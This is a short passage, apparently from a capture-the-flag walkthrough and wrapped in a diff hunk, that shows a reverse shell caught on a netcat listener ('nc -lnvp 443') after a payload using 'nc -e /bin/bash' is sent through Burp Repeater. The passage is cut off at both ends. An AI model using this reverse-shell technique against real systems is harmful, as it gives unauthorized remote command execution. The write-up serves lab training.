@@ -1,0 +1,1 @@
+Repeater, and add my payload: This request just hangs, but after a few seconds, there’s a connection at my listening nc : oxdf@hacky$ nc -lnvp 443 Listening on 0.0.0.0 443 Connection received on 10.129.234.87 45706 nc -e /bin/bash doesn’t print a prompt, but I’ll enter id and it returns the results: oxdf@hacky$ nc -lnvp
